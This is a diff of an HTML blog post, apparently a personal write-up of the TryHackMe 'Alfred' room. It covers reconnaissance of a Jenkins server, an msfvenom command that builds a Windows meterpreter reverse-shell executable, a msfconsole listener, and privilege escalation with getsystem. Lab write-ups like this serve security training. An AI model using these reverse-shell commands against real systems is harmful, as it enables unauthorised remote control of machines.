@@ -1,58 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<!-- 2026-03-29 Sun 21:03 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>THM: Alfred</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
-<script src="/src/copy-pre.min.js"></script><script src="/src/theme-switcher.min.js" defer></script><script src="/src/nav.min.js" defer></script><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind-ui.js"></script><script src="/src/search.min.js" defer></script><link rel="stylesheet" href="/src/rougier.min.css" /><link rel="icon" type="image/x-icon" href="/src/favicon.ico"><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="/src/copy-pre.min.js"></script><script src="/src/theme-switcher.min.js" defer></script><script src="/src/nav.min.js" defer></script><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind-ui.js"></script><script src="/src/search.min.js" defer></script><link rel="stylesheet" href="/src/rougier.min.css" /><link rel="icon" type="image/x-icon" href="/src/favicon.ico"><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
 </head>
 <body>
 <div id="preamble" class="status">
 <nav class="site-nav"> <div class="nav-header"> <a href="/" class="logo" aria-label="Home"> <span class="site-title">Chasing Simplicity</span> </a> <button id="menu-toggle" aria-label="Toggle menu"> <span class="hamburger"></span> </button> </div> <ul id="nav-menu"> <li><a href="/posts/recents.html" class="active">archive</a></li> <li><a href="/tags/index.html">tags</a></li> <li><a href="/posts/books.html">reading list</a></li> <li><a href="/posts/about.html">about</a></li> <li class="search-item"> <div id="search"></div> </li> <li class="theme-item"> <button id="theme-toggle" aria-label="Toggle theme">dark mode</button> </li> </ul> </nav>
 </div>
 <div id="content" class="content">
+<header>
 <h1 class="title">THM: Alfred</h1>
-<div id="table-of-contents" role="doc-toc">
+<nav class="post-tags">
+<span>Tags:</span> <a href="/tags/tryhackme.html" class="tag">tryhackme</a>
+</nav></header><nav id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgd33a74f">Intro</a></li>
-<li><a href="#org720023f">Reconnaissance</a>
+<li><a href="#orgd5a141c">Intro</a></li>
+<li><a href="#org72df307">Reconnaissance</a>
 <ul>
-<li><a href="#org26eb963">Web Analysis: Port 80 Web Server</a></li>
-<li><a href="#org04e6c4f">Web Analysis: Port 8080 Web Server</a></li>
+<li><a href="#orgea0627c">Web Analysis: Port 80 Web Server</a></li>
+<li><a href="#orgbcecc59">Web Analysis: Port 8080 Web Server</a></li>
 </ul>
 </li>
-<li><a href="#orge4b1fdd">Using Alfred</a></li>
-<li><a href="#orgd137b7c">Upgrading our shell</a>
+<li><a href="#org1d4317e">Using Alfred</a></li>
+<li><a href="#org86d9302">Upgrading our shell</a>
 <ul>
-<li><a href="#org36d4518">MSFvenom</a></li>
-<li><a href="#org35fff76">Meterpreter listener</a></li>
-<li><a href="#org9171b74">Downloading File</a></li>
+<li><a href="#org9ec7505">MSFvenom</a></li>
+<li><a href="#orgc5c82ff">Meterpreter listener</a></li>
+<li><a href="#orgf5ab6e1">Downloading File</a></li>
 </ul>
 </li>
-<li><a href="#org870d34d">Privilege escalation</a></li>
+<li><a href="#org80ba3b8">Privilege escalation</a></li>
 </ul>
 </div>
-</div>
-<div id="outline-container-orgd33a74f" class="outline-2">
-<h2 id="orgd33a74f"><a href="#orgd33a74f">Intro</a></h2>
-<div class="outline-text-2" id="text-orgd33a74f">
+</nav>
+<div id="outline-container-orgd5a141c" class="outline-2">
+<h2 id="orgd5a141c"><a href="#orgd5a141c">Intro</a></h2>
+<div class="outline-text-2" id="text-orgd5a141c">
 <p>
 This time, other than just populating <code>/etc/hosts</code> with <code>alfred.thm</code>, I
 also ran the following, to help me use my <i>standardized</i> notes.
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orgb794077"><span class="org-builtin">echo</span> <span class="org-string">"export IP=alfred.thm"</span> &gt;&gt; ~/.bashrc
+<pre class="src src-bash" id="org5c90150"><span class="org-builtin">echo</span> <span class="org-string">"export IP=alfred.thm"</span> &gt;&gt; ~/.bashrc
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org720023f" class="outline-2">
-<h2 id="org720023f"><a href="#org720023f">Reconnaissance</a></h2>
-<div class="outline-text-2" id="text-org720023f">
+<div id="outline-container-org72df307" class="outline-2">
+<h2 id="org72df307"><a href="#org72df307">Reconnaissance</a></h2>
+<div class="outline-text-2" id="text-org72df307">
 <p>
 Simple nmap scan to find our open tcp ports:
 </p>
@@ -70,9 +74,9 @@ And this gives us:
 <li class="off"><code>[&#xa0;]</code> 8080 (HTTP)</li>
 </ul>
 </div>
-<div id="outline-container-org26eb963" class="outline-3">
-<h3 id="org26eb963"><a href="#org26eb963">Web Analysis: Port 80 Web Server</a></h3>
-<div class="outline-text-3" id="text-org26eb963">
+<div id="outline-container-orgea0627c" class="outline-3">
+<h3 id="orgea0627c"><a href="#orgea0627c">Web Analysis: Port 80 Web Server</a></h3>
+<div class="outline-text-3" id="text-orgea0627c">
 <ul class="org-ul">
 <li>Minimal starting web page, started gobuster while trying the usual
 spots. Nothing of interest came up</li>
@@ -80,14 +84,14 @@ spots. Nothing of interest came up</li>
 </ul>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org0f24ea6">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
+<pre class="src src-bash" id="orgcddcf4d">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org04e6c4f" class="outline-3">
-<h3 id="org04e6c4f"><a href="#org04e6c4f">Web Analysis: Port 8080 Web Server</a></h3>
-<div class="outline-text-3" id="text-org04e6c4f">
+<div id="outline-container-orgbcecc59" class="outline-3">
+<h3 id="orgbcecc59"><a href="#orgbcecc59">Web Analysis: Port 8080 Web Server</a></h3>
+<div class="outline-text-3" id="text-orgbcecc59">
 <ul class="org-ul">
 <li>Jenkins entry portal</li>
 <li>Robots.txt disallows everything on root</li>
@@ -103,11 +107,11 @@ spots. Nothing of interest came up</li>
 </ul></li>
 </ul>
 
-<div id="org56bbb41" class="figure">
-<p><img src="images/Reconnaissance/20231130_145031_screenshot.png" alt="20231130_145031_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 1: </span>Jenkins Entry portal</p>
-</div>
+<figure id="org143c3ff">
+<img src="images/Reconnaissance/20231130_145031_screenshot.png" alt="20231130_145031_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>Jenkins Entry portal</figcaption>
+</figure>
 
 
 
@@ -121,9 +125,9 @@ another, better way to go.
 </div>
 </div>
 </div>
-<div id="outline-container-orge4b1fdd" class="outline-2">
-<h2 id="orge4b1fdd"><a href="#orge4b1fdd">Using Alfred</a></h2>
-<div class="outline-text-2" id="text-orge4b1fdd">
+<div id="outline-container-org1d4317e" class="outline-2">
+<h2 id="org1d4317e"><a href="#org1d4317e">Using Alfred</a></h2>
+<div class="outline-text-2" id="text-org1d4317e">
 <p>
 Since I already knew that Alfred is a CI/CD server, even though I had
 never worked on it, it was relatively simple:
@@ -135,10 +139,10 @@ that action was <b>directly</b> modifiable.
 </p></li>
 </ul>
 
-<div id="org08655b7" class="figure">
-<p><img src="images/Using_Alfred/20231201_231517_screenshot.png" alt="20231201_231517_screenshot.png">
-</p>
-</div>
+<figure id="org1b4c17e">
+<img src="images/Using_Alfred/20231201_231517_screenshot.png" alt="20231201_231517_screenshot.png">
+
+</figure>
 
 <p>
 At this point, it is obvious that we need to get initial foothold
@@ -155,43 +159,43 @@ However, that did not stop me from getting the flag. Unlikeable is not unusable.
 </p>
 </div>
 </div>
-<div id="outline-container-orgd137b7c" class="outline-2">
-<h2 id="orgd137b7c"><a href="#orgd137b7c">Upgrading our shell</a></h2>
-<div class="outline-text-2" id="text-orgd137b7c">
+<div id="outline-container-org86d9302" class="outline-2">
+<h2 id="org86d9302"><a href="#org86d9302">Upgrading our shell</a></h2>
+<div class="outline-text-2" id="text-org86d9302">
 <p>
 The room then suggests that we get a meterpreter shell, which I again,
 trying to avoid the <i>walkthrough</i> character of it, did my way.
 </p>
 </div>
-<div id="outline-container-org36d4518" class="outline-3">
-<h3 id="org36d4518"><a href="#org36d4518">MSFvenom</a></h3>
-<div class="outline-text-3" id="text-org36d4518">
+<div id="outline-container-org9ec7505" class="outline-3">
+<h3 id="org9ec7505"><a href="#org9ec7505">MSFvenom</a></h3>
+<div class="outline-text-3" id="text-org9ec7505">
 <p>
 Just a simple meterpreter reverse shell:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-cmd" id="org3e48320">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.67.161 LPORT=6969 -f exe -o reverse.exe
+<pre class="src src-cmd" id="orge4cd994">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.67.161 LPORT=6969 -f exe -o reverse.exe
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org35fff76" class="outline-3">
-<h3 id="org35fff76"><a href="#org35fff76">Meterpreter listener</a></h3>
-<div class="outline-text-3" id="text-org35fff76">
+<div id="outline-container-orgc5c82ff" class="outline-3">
+<h3 id="orgc5c82ff"><a href="#orgc5c82ff">Meterpreter listener</a></h3>
+<div class="outline-text-3" id="text-orgc5c82ff">
 <p>
 Get the listener up and running
 </p>
 
 <div class="org-src-container">
-<pre class="src src-cmd" id="org5bb5a9b">msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.67.161; set lport 6969; exploit"
+<pre class="src src-cmd" id="orgbc8c13b">msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.67.161; set lport 6969; exploit"
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org9171b74" class="outline-3">
-<h3 id="org9171b74"><a href="#org9171b74">Downloading File</a></h3>
-<div class="outline-text-3" id="text-org9171b74">
+<div id="outline-container-orgf5ab6e1" class="outline-3">
+<h3 id="orgf5ab6e1"><a href="#orgf5ab6e1">Downloading File</a></h3>
+<div class="outline-text-3" id="text-orgf5ab6e1">
 <p>
 My experience with windows is quite limited and that&rsquo;s why I had to go
 into a little bit more research to get this over with :(
@@ -216,9 +220,9 @@ procedure in Linux.
 </div>
 </div>
 </div>
-<div id="outline-container-org870d34d" class="outline-2">
-<h2 id="org870d34d"><a href="#org870d34d">Privilege escalation</a></h2>
-<div class="outline-text-2" id="text-org870d34d">
+<div id="outline-container-org80ba3b8" class="outline-2">
+<h2 id="org80ba3b8"><a href="#org80ba3b8">Privilege escalation</a></h2>
+<div class="outline-text-2" id="text-org80ba3b8">
 <p>
 Sadly <code>getsystem</code> works perfectly, and we get <code>NT AUTHORITY\SYSTEM</code>,
 without it being necessary to do anything.
